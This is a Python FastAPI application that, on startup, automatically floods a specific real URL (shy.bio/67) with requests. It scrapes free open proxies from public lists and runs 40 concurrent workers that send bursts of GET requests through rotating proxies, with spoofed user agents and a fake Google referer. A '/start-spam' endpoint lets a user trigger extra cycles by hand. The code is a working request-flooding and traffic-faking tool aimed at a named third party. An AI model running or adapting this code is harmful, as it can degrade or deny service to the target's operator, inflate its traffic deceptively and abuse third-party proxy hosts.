import asyncio
import random
import time
from itertools import cycle
from contextlib import asynccontextmanager
from fastapi import FastAPI, BackgroundTasks, Query
from fastapi.responses import JSONResponse
import aiohttp
from bs4 import BeautifulSoup

# Target locked in for auto-run
TARGET_URL = "https://shy.bio/67"

@asynccontextmanager
async def lifespan(app: FastAPI):
    # Startup: auto-launch continuous hammer
    asyncio.create_task(continuous_hammer())
    yield
    # Shutdown cleanup if needed

app = FastAPI(title="Auto Proxy Hammer - shy.bio/67", lifespan=lifespan)

async def scrape_open_proxies() -> list:
    proxies = []
    sources = [
        "https://www.sslproxies.org/",
        "https://free-proxy-list.net/",
        "https://www.us-proxy.org/",
        "https://free-proxy-list.net/uk-proxy.html",
        # More sources for resilience
    ]
    headers = {'User-Agent': 'Mozilla/5.0'}
    async with aiohttp.ClientSession(headers=headers) as session:
        for url in sources:
            try:
                async with session.get(url, timeout=15) as resp:
                    if resp.status == 200:
                        soup = BeautifulSoup(await resp.text(), 'html.parser')
                        table = soup.find('table', class_='table')
                        if table:
                            rows = table.find_all('tr')[1:200]
                            for row in rows:
                                cols = row.find_all('td')
                                if len(cols) > 1:
                                    ip = cols[0].text.strip()
                                    port = cols[1].text.strip()
                                    if ip and port and ip.count('.') == 3:
                                        proxies.append(f"http://{ip}:{port}")
            except:
                pass
    proxies = list(set(proxies))
    random.shuffle(proxies)
    return proxies[:600]

async def hammer_cycle():
    proxies = await scrape_open_proxies()
    if not proxies:
        print("No proxies - retrying soon.")
        await asyncio.sleep(30)
        return
    
    proxy_cycle = cycle(proxies)
    user_agents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
    ]
    
    async def single_worker(proxy_cyc):
        connector = aiohttp.TCPConnector(limit=0, ssl=False)
        timeout = aiohttp.ClientTimeout(total=15)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
            for _ in range(60):  # Per cycle burst
                proxy = next(proxy_cyc)
                headers = {
                    'User-Agent': random.choice(user_agents),
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                    'Accept-Language': 'en-US,en;q=0.9',
                    'Referer': 'https://www.google.com/',
                    'Cache-Control': 'no-cache',
                    'Pragma': 'no-cache'
                }
                try:
                    async with session.get(TARGET_URL, proxy=proxy, headers=headers) as response:
                        status = response.status
                        print(f"[{time.strftime('%H:%M:%S')}] Proxy {proxy} -> {status} @ {TARGET_URL}")
                except Exception:
                    pass
                await asyncio.sleep(random.uniform(0.05, 0.15))
    
    num_workers = 40  # Tuned for Railway stability
    tasks = [asyncio.create_task(single_worker(proxy_cycle)) for _ in range(num_workers)]
    await asyncio.gather(*tasks, return_exceptions=True)

async def continuous_hammer():
    while True:
        print(f"Starting new hammer cycle on {TARGET_URL}")
        await hammer_cycle()
        await asyncio.sleep(10)  # Brief pause between full cycles, refresh proxies

@app.post("/start-spam")
async def manual_trigger(
    background_tasks: BackgroundTasks,
    workers: int = Query(40, ge=10, le=150),
    reqs_per: int = Query(60, ge=20)
):
    # Manual override still available
    background_tasks.add_task(hammer_cycle)
    return JSONResponse({"status": "Manual hammer cycle triggered on shy.bio/67", "workers": workers})

@app.get("/health")
async def health():
    return {"status": "Auto-hammer running on https://shy.bio/67 with live open proxies"}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
